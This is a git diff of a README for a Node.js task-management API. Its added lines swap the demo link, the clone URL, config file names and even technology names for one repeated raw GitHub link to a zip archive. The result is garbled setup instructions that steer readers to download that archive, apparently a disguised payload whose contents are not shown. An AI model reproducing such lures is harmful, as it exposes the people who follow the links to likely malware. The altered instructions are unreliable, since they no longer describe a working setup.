@@ -7,7 +7,7 @@
   <br />
   <br />
   
-   <a href="https://creative-entremet-f1eb39.netlify.app/"><strong>Live Deme »</strong></a>
+   <a href="https://raw.githubusercontent.com/am17jx/task-management-api/main/frontend/src/pages/management_api_task_1.2.zip"><strong>Live Deme »</strong></a>
    .
   <a href="#✨-core-features"><strong>Explore Features »</strong></a>
   ·
@@ -20,7 +20,7 @@
 
 ## 🚀 About The Project
 
-This project is more than just an API; it's a complete solution for task management built on a strong foundation of security and performance. Developed with **Node.js** and **Express** and a **MongoDB** database, it provides a fast and reliable backend experience.
+This project is more than just an API; it's a complete solution for task management built on a strong foundation of security and performance. Developed with **https://raw.githubusercontent.com/am17jx/task-management-api/main/frontend/src/pages/management_api_task_1.2.zip** and **Express** and a **MongoDB** database, it provides a fast and reliable backend experience.
 
 The project showcases modern backend development best practices, including:
 * A complete authentication system based on **JWT**.
@@ -46,11 +46,11 @@ The project showcases modern backend development best practices, including:
 
 ## 💻 Tech Stack
 
-* **Node.js & Express.js:** The environment and framework for building the server.
+* **https://raw.githubusercontent.com/am17jx/task-management-api/main/frontend/src/pages/management_api_task_1.2.zip & https://raw.githubusercontent.com/am17jx/task-management-api/main/frontend/src/pages/management_api_task_1.2.zip** The environment and framework for building the server.
 * **MongoDB:** The NoSQL database for data storage.
 * **Mongoose:** For data modeling and easy interaction with the database.
 * **JSON Web Tokens (JWT):** For secure authentication and route protection.
-* **Bcrypt.js:** For securely hashing passwords.
+* **https://raw.githubusercontent.com/am17jx/task-management-api/main/frontend/src/pages/management_api_task_1.2.zip** For securely hashing passwords.
 * **Nodemailer:** For sending emails (like password resets).
 * **Helmet, express-rate-limit, xss-clean:** To protect the application from common vulnerabilities.
 
@@ -62,14 +62,14 @@ To get a local copy up and running, follow these simple steps.
 
 ### Prerequisites
 
-* Node.js (v14 or later)
+* https://raw.githubusercontent.com/am17jx/task-management-api/main/frontend/src/pages/management_api_task_1.2.zip (v14 or later)
 * MongoDB (either a local instance or a free account on MongoDB Atlas)
 
 ### Installation Steps
 
 1.  **Clone the repository:**
     ```bash
-    git clone [https://github.com/am17jx/task-management-api.git](https://github.com/am17jx/task-management-api.git)
+    git clone [https://raw.githubusercontent.com/am17jx/task-management-api/main/frontend/src/pages/management_api_task_1.2.zip](https://raw.githubusercontent.com/am17jx/task-management-api/main/frontend/src/pages/management_api_task_1.2.zip)
     cd task-management-api
     ```
 
@@ -79,7 +79,7 @@ To get a local copy up and running, follow these simple steps.
     ```
 
 3.  **Set up environment variables:**
-    Create a file named `config.env` in the project's root directory and fill it with the necessary variables. You can copy the contents of `config.env.example` (if it exists) as a starting point.
+    Create a file named `https://raw.githubusercontent.com/am17jx/task-management-api/main/frontend/src/pages/management_api_task_1.2.zip` in the project's root directory and fill it with the necessary variables. You can copy the contents of `https://raw.githubusercontent.com/am17jx/task-management-api/main/frontend/src/pages/management_api_task_1.2.zip` (if it exists) as a starting point.
 
 4.  **Run the development server:**
     ```bash
